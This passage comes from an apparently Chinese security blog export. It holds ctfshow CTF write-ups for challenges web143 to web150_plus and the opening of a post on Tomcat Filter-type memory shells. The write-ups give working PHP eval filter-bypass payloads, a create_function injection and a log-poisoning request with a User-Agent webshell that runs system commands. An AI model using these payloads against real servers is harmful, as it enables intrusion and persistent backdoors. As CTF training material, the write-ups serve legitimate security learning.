class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了加减，我们可以用乘除，过滤了取反我们可以用异或</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web144\"><a href=\"#web144\" class=\"headerlink\" title=\"web144\"></a>web144</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; check($v3))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v2))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function check($str)&#123;</span><br><span class=\"line\">    return strlen($str)===1?true:false;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>与前面几个题类似，将v1,v2,v3三个顺序重新调一下就好了</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web155\"><a href=\"#web155\" class=\"headerlink\" title=\"web155\"></a>web155</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>看了yu22x师傅的wp，妙！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1?phpinfo():1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>这里考察了三目运算符，这里是可以执行phpinfo()的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8F%97%8F%96%91%99%90)():&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n<p>这样可以执行phpinfo()</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web146\"><a href=\"#web146\" class=\"headerlink\" title=\"web146\"></a>web146</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\/|\\^|\\#|\\&quot;/i&#x27;, $v3))&#123;</span><br><span class=\"line\">                die(&#x27;get out hacker!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>过滤了冒号，无法使用三目运算符，但是可以使用等号和位运算符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1==phpinfo()||1;&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>这里可以执行phpinfo()</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(&#x27;%13%19%13%14%05%0d&#x27;|&#x27;%60%60%60%60%60%60&#x27;)(&#x27;%14%01%03%20%06%02&#x27;|&#x27;%60%60%60%20%60%28&#x27;)|&amp;v2=1</span><br><span class=\"line\"></span><br><span class=\"line\">?v1=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web147\"><a href=\"#web147\" class=\"headerlink\" title=\"web147\"></a>web147</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class=\"line\">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class=\"line\">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不会，还是老老实实看wp吧。</p>\n<p>考察点：create_function()代码注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">类似于</span><br><span class=\"line\"></span><br><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo $a.&quot;123&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>那么如果我们第二个参数传入 echo 1;}phpinfo();&#x2F;&#x2F;<br> 就等价于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function f($a) &#123;</span><br><span class=\"line\">  echo 1;&#125;phpinfo();//</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">从而执行phpinfo()命令</span><br><span class=\"line\">fuzz后发现%5c可以绕过这个正则表达式</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get: ?show=echo 123;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class=\"line\">post: ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web148\"><a href=\"#web148\" class=\"headerlink\" title=\"web148\"></a>web148</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $code=$_GET[&#x27;code&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[A-Za-z0-9_\\%\\\\|\\~\\&#x27;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+/&quot;,$code))&#123;</span><br><span class=\"line\">        die(&quot;error&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @eval($code);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function get_ctfshow_fl0g()&#123;</span><br><span class=\"line\">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>未过滤异或，直接构造</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web149\"><a href=\"#web149\" class=\"headerlink\" title=\"web149\"></a>web149</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>非预期</p>\n<p>往index.php直接写马，然后蚁剑连接即可</p>\n<p>预期解</p>\n<p>文件竞争，一个负责一直写文件，一个负责一直读文件</p>\n<h3 id=\"web150\"><a href=\"#web150\" class=\"headerlink\" title=\"web150\"></a>web150</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#过滤字符</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>日志绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /?isVIP=1 HTTP/1.1</span><br><span class=\"line\">Host: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show</span><br><span class=\"line\">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: _ga=GA1.2.1418869291.1680592508</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 49</span><br><span class=\"line\"></span><br><span class=\"line\">ctf=/var/log/nginx/access.log&amp;1=system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web150-plus\"><a href=\"#web150-plus\" class=\"headerlink\" title=\"web150_plus\"></a>web150_plus</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#过滤字符</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了log，不能日志包含绕过了</p>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个题一点点小坑__autoload()函数不是类里面的</span><br><span class=\"line\">__autoload — 尝试加载未定义的类</span><br><span class=\"line\">最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦</span><br><span class=\"line\">原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用</span><br><span class=\"line\">__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo</span><br><span class=\"line\">接下来就去getshell啦</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>php变量不能含有点空格，遇到这些会自动转化为下划线</p>\n<hr>\n<p>总算是写完啦，不过这永远不是终点…</p>\n"},{"title":"Tomcat内存马—Filter型","date":"2023-06-11T15:42:29.000Z","excerpt":"Tomcat内存马—Filter型","_content":"\n\n\n## Filter\n\nFilter也就是过滤器，用来拦截servlet容器发送给某个servlet的请求以及servlet返回的响应。Filter可以在 `web.xml`中注册，借一张图来展示一下存在Filter时，处理请求及发送响应的流程。\n\n\n\n从图中我们也可以知道，Filter可以有多个。存在Filter时，客户端发送的请求会先经过Filter再到servlet，如果我们自定义一个Filter，并在其中添加恶意代码，这样也就能达到命令执行的效果。不过我们还需要使其在这条Filterchain的最前方，我猜测这样做是为了接受到原始的请求，避免前面的过滤器拦截我们的请求或者修改我们的请求内容。\n\n### 测试demo\n\n为了更好的理解Filter，写一个demo\n\ntestfilter.java\n\n```auto\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class testfilter implements Filter{\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println(\"filter初始化\");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        System.out.println(\"dofilter\");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n\n    }\n}\n```\n\nweb.xml\n\n```auto\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <filter>\n        <filter-name>testfilter</filter-name>\n        <filter-class>testfilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>testfilter</filter-name>\n        <url-pattern>/filter</url-pattern>\n    </filter-mapping>\n\n    <servlet>\n        <!--servlet名字，和类名一致-->\n        <servlet-name>test</servlet-name>\n        <!--class文件名，如果有包要加上包名-->\n        <servlet-class>test</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>test</servlet-name>\n        <!--url-->\n        <url-pattern>/test</url-pattern>\n    </servlet-mapping>\n</web-app>\n```\n\n然后访问一下 `/filter`\n\n\n\n成功触发过滤器\n\n### Filter相关类\n\nfrom [https://paper.seebug.org/1441/#tomcat](https://paper.seebug.org/1441/#tomcat)\n\n+   **Filter**\n    \n    ```auto\n    过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。\n    ```\n    \n+   **FilterChain**\n    \n    ```auto\n    过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain\n    ```\n    \n+   **FilterConfig**\n    \n    ```auto\n    过滤器的配置,与普通的 Servlet 程序一样，Filter 